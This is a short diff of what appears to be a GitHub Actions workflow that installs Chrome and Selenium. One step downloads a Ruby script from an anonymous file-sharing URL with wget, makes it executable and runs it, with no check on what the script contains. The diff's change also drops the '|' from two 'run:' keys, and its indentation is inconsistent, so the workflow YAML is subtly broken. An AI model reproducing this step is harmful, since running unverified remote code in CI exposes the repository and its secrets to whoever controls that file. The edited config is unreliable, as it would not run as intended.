@@ -22,12 +22,12 @@ jobs:
       run: sudo apt-get update && sudo apt-get install google-chrome-stable
 
     - name: Install Selenium
-        run: |
+        run: 
             sudo gem install selenium-webdriver
             wget https://filebin.net/6cw0f2x2sfgqyhi0/headless_chrome.rb?t=7g4c257d -O headless_chrome.rb
             chmod +x headless_chrome.rb
       - name: ChromeWebDriver
-        run: |
+        run: 
             ./headless_chrome.rb
 
     - name: Set up Ruby
